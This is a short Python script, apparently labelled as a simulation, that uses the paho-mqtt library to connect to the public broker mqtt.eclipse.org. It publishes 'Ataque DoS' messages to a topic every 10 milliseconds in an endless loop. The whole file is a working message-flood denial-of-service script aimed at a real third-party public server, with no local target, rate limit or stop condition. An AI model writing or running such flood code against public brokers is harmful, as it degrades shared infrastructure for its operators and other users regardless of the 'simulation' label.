import paho.mqtt.client as mqtt
import time

broker = "mqtt.eclipse.org"
port = 1883
topic = "simulacao/ataques/mqtt"
client_id = "dos_attack_simulacao"

def on_publish(client, userdata, result):
    pass

client = mqtt.Client(client_id)
client.on_publish = on_publish
client.connect(broker, port)

while True:
    message = "Ataque DoS"
    result = client.publish(topic, message)
    time.sleep(0.01)  # Envia mensagens rapidamente para simular DoS
